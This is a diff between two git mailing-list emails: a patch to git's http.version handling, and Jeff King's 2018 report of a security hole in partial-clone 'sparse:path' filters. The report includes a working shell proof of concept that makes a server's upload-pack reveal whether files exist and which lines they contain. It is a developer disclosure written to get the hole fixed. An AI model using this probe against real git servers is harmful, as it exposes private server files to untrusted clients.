@@ -2,150 +2,175 @@ Return-Path: <git-owner@vger.kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
 X-Spam-Level: 
 X-Spam-ASN: AS31976 209.132.180.0/23
-X-Spam-Status: No, score=-3.9 required=3.0 tests=AWL,BAYES_00,DKIM_SIGNED,
-	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
+X-Spam-Status: No, score=-4.0 required=3.0 tests=AWL,BAYES_00,
 	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
 	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by dcvr.yhbt.net (Postfix) with ESMTP id 7A69F1F453
-	for <e@80x24.org>; Thu,  8 Nov 2018 04:55:25 +0000 (UTC)
+	by dcvr.yhbt.net (Postfix) with ESMTP id C4B1D1F453
+	for <e@80x24.org>; Thu,  8 Nov 2018 05:08:25 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1728761AbeKHO2m (ORCPT <rfc822;e@80x24.org>);
-        Thu, 8 Nov 2018 09:28:42 -0500
-Received: from mail-pf1-f175.google.com ([209.85.210.175]:39951 "EHLO
-        mail-pf1-f175.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1728841AbeKHO2l (ORCPT <rfc822;git@vger.kernel.org>);
-        Thu, 8 Nov 2018 09:28:41 -0500
-Received: by mail-pf1-f175.google.com with SMTP id x2-v6so4665515pfm.7
-        for <git@vger.kernel.org>; Wed, 07 Nov 2018 20:55:04 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=date:message-id:in-reply-to:references:from:subject:fcc
-         :content-transfer-encoding:mime-version:to:cc;
-        bh=yADFirXFZr6zO2b5q2BzJvz1g09fhbkE5G6ro00Rza8=;
-        b=gjQTD9UXYctBuGHOT2FbMjrwilGDxecYXvsMqtfbowi4aIM0O1hSCZXMYeDKdw8d1Z
-         8J6/mOPOJn7/MkNUwOF+XSdHEGdQtvbGaDU/wqFx2obRX8tPlyyMViTdA0ix3aKFKlM9
-         4yd7wwYqiSL2zrCkAMoN6aEfwrH/cNAFsXiOQszhHwXuAS7JsmAT943RhjCkDWo+Eau5
-         Cpdnvzz/EuNqz81QYZmI/KH42/nC5yClm6FUc8ZrU+fz+Rbx8kEuyBzZq6tNhiShEREr
-         oGcwp47dyfPodxIjiWLF33Q1zeFHDvBGo+g2JrqCVRqkZTh6mn5Acspjkw3Q35j/osAW
-         TjYA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:date:message-id:in-reply-to:references:from
-         :subject:fcc:content-transfer-encoding:mime-version:to:cc;
-        bh=yADFirXFZr6zO2b5q2BzJvz1g09fhbkE5G6ro00Rza8=;
-        b=aN7M7l2c67vvGvHWO7zCM+LNcF7PdqgTsPi5Fhdjt/fqz69ENvY9iNuYHiZOGto8QX
-         5/vyejvDAaDhj29Ycwzi89K/qdRhtUmLUDogDAPMLS+UpyaPE6XVo+/4c0LcOID16BZB
-         qP396ShRLSHxYrEfdTSbVrUUvT+F23wYAuiBgFKd3g3EzW+Tytz39CADy60QRVh6jolJ
-         9Ev6N3PYBuQf6D1rvWQRLtxYLXCMM4leSwv2bbU6SzFBoNtI2Xq8OMfIYFzWk05SvDTx
-         MsZHXTj4bJ298Ehw1f/eEnTujXlO1FAXgyJ61n17vdYJiDeWl/lECuUhRKNJwN1yfdyQ
-         7daw==
-X-Gm-Message-State: AGRZ1gKAidmYNvJVjb+Sbsl+fPzD/Y8RWAGvZoxt+jHK1kgRgiO1x4qQ
-        fWNt7Mv9rIG7FdpNR3rOcewH5qB+
-X-Google-Smtp-Source: AJdET5c4oXT5Xedg+DgUxWXUlTKyCThCnFEoepiEyKyFa65WpCcRbqW9F6h6TUYYi8kk1bLGNPnp7Q==
-X-Received: by 2002:a63:a552:: with SMTP id r18mr2652680pgu.176.1541652903517;
-        Wed, 07 Nov 2018 20:55:03 -0800 (PST)
-Received: from [127.0.0.1] ([40.112.139.188])
-        by smtp.gmail.com with ESMTPSA id p6-v6sm2772391pfg.30.2018.11.07.20.55.02
-        (version=TLS1_2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128/128);
-        Wed, 07 Nov 2018 20:55:02 -0800 (PST)
-Date:   Wed, 07 Nov 2018 20:55:02 -0800 (PST)
-X-Google-Original-Date: Thu, 08 Nov 2018 04:54:55 GMT
-Message-Id: <ef975b60930601f295d1dc6149e63551da211bf0.1541652896.git.gitgitgadget@gmail.com>
-In-Reply-To: <pull.69.v3.git.gitgitgadget@gmail.com>
-References: <pull.69.v2.git.gitgitgadget@gmail.com>
-        <pull.69.v3.git.gitgitgadget@gmail.com>
-From:   "Force Charlie via GitGitGadget" <gitgitgadget@gmail.com>
-Subject: [PATCH v3 4/4] http: change http.version value type
-Fcc:    Sent
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
-MIME-Version: 1.0
+        id S1728801AbeKHOlh (ORCPT <rfc822;e@80x24.org>);
+        Thu, 8 Nov 2018 09:41:37 -0500
+Received: from cloud.peff.net ([104.130.231.41]:44544 "HELO cloud.peff.net"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
+        id S1728499AbeKHOlg (ORCPT <rfc822;git@vger.kernel.org>);
+        Thu, 8 Nov 2018 09:41:36 -0500
+Received: (qmail 31282 invoked by uid 109); 8 Nov 2018 05:07:58 -0000
+Received: from Unknown (HELO peff.net) (10.0.1.2)
+ by cloud.peff.net (qpsmtpd/0.94) with SMTP; Thu, 08 Nov 2018 05:07:58 +0000
+Authentication-Results: cloud.peff.net; auth=none
+Received: (qmail 25997 invoked by uid 111); 8 Nov 2018 05:07:16 -0000
+Received: from sigill.intra.peff.net (HELO sigill.intra.peff.net) (10.0.0.7)
+ by peff.net (qpsmtpd/0.94) with (ECDHE-RSA-AES256-GCM-SHA384 encrypted) SMTP; Thu, 08 Nov 2018 00:07:16 -0500
+Authentication-Results: peff.net; auth=none
+Received: by sigill.intra.peff.net (sSMTP sendmail emulation); Thu, 08 Nov 2018 00:07:55 -0500
+Date:   Thu, 8 Nov 2018 00:07:55 -0500
+From:   Jeff King <peff@peff.net>
 To:     git@vger.kernel.org
-Cc:     Junio C Hamano <gitster@pobox.com>,
-        Force Charlie <charlieio@outlook.com>
+Cc:     Jeff Hostetler <jeffhost@microsoft.com>,
+        Jonathan Tan <jonathantanmy@google.com>,
+        Matthew DeVore <matvore@google.com>
+Subject: how does "clone --filter=sparse:path" work?
+Message-ID: <20181108050755.GA32158@sigill.intra.peff.net>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
 Sender: git-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
-From: Force Charlie <charlieio@outlook.com>
+[cc-ing people who worked on or seem interested in partial-clone
+filters]
 
-Signed-off-by: Force Charlie <charlieio@outlook.com>
----
- http.c | 39 ++++++++++++++++++++++++++++++---------
- 1 file changed, 30 insertions(+), 9 deletions(-)
+I've been exploring the partial-clone options a bit, and took a look at
+the "sparse:path" option. I had some confusion initially, because I
+expected it work something like this:
 
-diff --git a/http.c b/http.c
-index 86e454cff5..0ad797caea 100644
---- a/http.c
-+++ b/http.c
-@@ -48,7 +48,7 @@ char curl_errorstr[CURL_ERROR_SIZE];
- 
- static int curl_ssl_verify = -1;
- static int curl_ssl_try;
--static int curl_http_version = 0;
-+static const char *curl_http_version = NULL;
- static const char *ssl_cert;
- static const char *ssl_cipherlist;
- static const char *ssl_version;
-@@ -286,8 +286,7 @@ static void process_curl_messages(void)
- static int http_options(const char *var, const char *value, void *cb)
- {
- 	if (!strcmp("http.version",var)) {
--		curl_http_version=git_config_int(var,value);
--		return 0;
-+		return git_config_string(&curl_http_version, var, value);
- 	}
- 	if (!strcmp("http.sslverify", var)) {
- 		curl_ssl_verify = git_config_bool(var, value);
-@@ -794,6 +793,30 @@ static long get_curl_allowed_protocols(int from_user)
- }
- #endif
- 
-+#if LIBCURL_VERSION_NUM >=0x072f00
-+static int get_curl_http_version_opt(const char *version_string, long *opt)
-+{
-+	int i;
-+	static struct {
-+		const char *name;
-+		long opt_token;
-+	} choice[] = {
-+		{ "HTTP/1.1", CURL_HTTP_VERSION_1_1 },
-+		{ "HTTP/2", CURL_HTTP_VERSION_2 }
-+	};
-+
-+	for (i = 0; i < ARRAY_SIZE(choice); i++) {
-+		if (!strcmp(version_string, choice[i].name)) {
-+			*opt = choice[i].opt_token;
-+			return 0;
-+		}
-+	}
-+
-+	return -1; /* not found */
-+}
-+
-+#endif
-+
- static CURL *get_curl_handle(void)
- {
- 	CURL *result = curl_easy_init();
-@@ -812,12 +835,10 @@ static CURL *get_curl_handle(void)
- 	}
- 
- #if LIBCURL_VERSION_NUM >= 0x072f00 // 7.47.0
--    // curl_http_version 0 is default.
--    if (curl_http_version == 20) {
--		/* Enable HTTP2*/
--		curl_easy_setopt(result, CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_2TLS);
--    } else if (curl_http_version == 11) {
--		curl_easy_setopt(result, CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);
-+    long opt=-1;
-+    if (curl_http_version &&!get_curl_http_version_opt(curl_http_version, &opt)) {
-+		/* Set request use http version */
-+		curl_easy_setopt(result, CURLOPT_HTTP_VERSION,opt);
-     }
- #endif
- 
--- 
-gitgitgadget
+  git clone --filter=sparse:path=Documentation .
+
+But it really doesn't take an in-repo path. You have to specify a path
+to a file that contains a file with .gitignore patterns. Except they're
+actually _inverted_ patterns (i.e., what to include). Which confused me
+again, but I guess makes sense if these are meant to be adapted from
+sparse-checkout files.
+
+So my first question is: how is this meant to be used?
+
+I guess the idea is that somebody (the repo admin?) makes a set of
+pre-made profiles, with each profile mentioning some subset of paths.
+And then when you clone, you say, "I want the foo profile". How is that
+profile stored and accessed?
+
+If it's a blob in the repository, I think you can use something like
+"--filter=sparse:oid=profiles:foo". And then after cloning, you'd
+do "git cat-file blob profiles:foo >.git/sparse-checkout" or similar.
+That seems like something that could be wrapped up in a single clone
+option, but I can't find one; I won't be surprised if it simply hasn't
+happened yet.
+
+But if it's a path, then what? I'd imagine that you'd "somehow" get a
+copy of the sparse profile you want out-of-band. And then you'd say "I
+want to clone with the profile in this file", and then copy it into the
+sparse-checkout file to do the checkout.
+
+But the sparse-checkout file in the filter is not expanded locally, with
+patterns sent over the wire. The _filename_ is sent over the wire, and
+then upload-pack expands it. So you can't specify an arbitrary set of
+patterns; you have to know about the profile names (how?) on the server.
+That's not very flexible, though I imagine it may make certain things
+easier on the server (e.g., if you pack in such a way to efficiently
+serve only particular profiles).
+
+But I'm also concerned it's dangerous. We're reading gitignore patterns
+from an arbitrary name on the server's filesystem, with that name coming
+from an untrusted client. So I can do:
+
+  git clone --filter=sparse:path=/etc/passwd $remote
+
+and the server will read /etc/passwd. There's probably a lot of mischief
+you can get up to with that. Sadly reading /proc/self/mem doesn't work,
+because the gitignore code fstat()s the file to find out how much to
+read, and the st_size there is 0. But there are probably others
+(/proc/kcore is a fun one, but nobody is running their git server as
+root, right?).
+
+Below is a proof of concept script that uses this as an oracle to
+explore the filesystem, as well as individual lines of files.
+
+Should we simply be disallowing sparse:path filters over upload-pack?
+
+-Peff
+
+-- >8 --
+# Set this to host:repo.git to see a real cross-machine connection (which makes
+# it more obvious which side is reading which files).  For a simulated local
+# one, we'll use --no-local to make sure we really run upload-pack.
+SERVER=server.git
+
+# Do these steps manually on the remote side if you're trying it cross-server.
+case "$SERVER" in
+*:*)
+	;;
+*)
+	# Imagine a server with a repository users can push to, with filters enabled.
+	git init -q --bare $SERVER
+	git -C $SERVER config uploadpack.allowfilter true
+
+	# Imagine the server has a file outside of the repo we're interested in.
+	echo foo >/tmp/secret
+	;;
+esac
+
+# Some base setup.
+git clone -q $SERVER local
+git -C local commit -q --allow-empty -m 'some base commit'
+git -C local push -q
+
+# We can find out whether a path exists on the filesystem.
+probe_file () {
+	# The remote upload-pack will barf if it cannot read the path $1.
+	rm -rf result
+	if git clone --bare --no-local --filter=sparse:path=$1 \
+		$SERVER result >/dev/null 2>&1
+	then
+		echo "$1 exists"
+	else
+		echo "$1 does not exist"
+	fi
+}
+probe_file /tmp/missing
+probe_file /tmp/secret
+
+# We can also check individual lines in a file.
+probe_line () {
+	# Make a probe that contains the path $2.
+	(
+		cd local
+		echo $2 >$2
+		git add $2
+		git commit -m "probe for $2"
+		git push
+	) >/dev/null 2>&1
+
+	# And then fetch that probe with the filter to see
+	# if it was included. This needs to be bare so we don't
+	# do a followup fetch to checkout.
+	rm -rf result
+	git clone -q --bare --no-local --filter=sparse:path=$1 \
+		$SERVER result
+
+	# We have all the information we need now, but we have to convince Git
+	# to tell it to us. There's no way to set fetch_if_missing externally,
+	# but we can drop the remote, which means that excluded paths
+	# will result in an error.
+	git -C result remote rm origin
+	if git -C result cat-file -t HEAD:$2 >/dev/null 2>&1
+	then
+		echo "$1 contains line $2"
+	else
+		echo "$1 does not contain line $2"
+	fi
+}
+probe_line /tmp/secret foo
+probe_line /tmp/secret bar
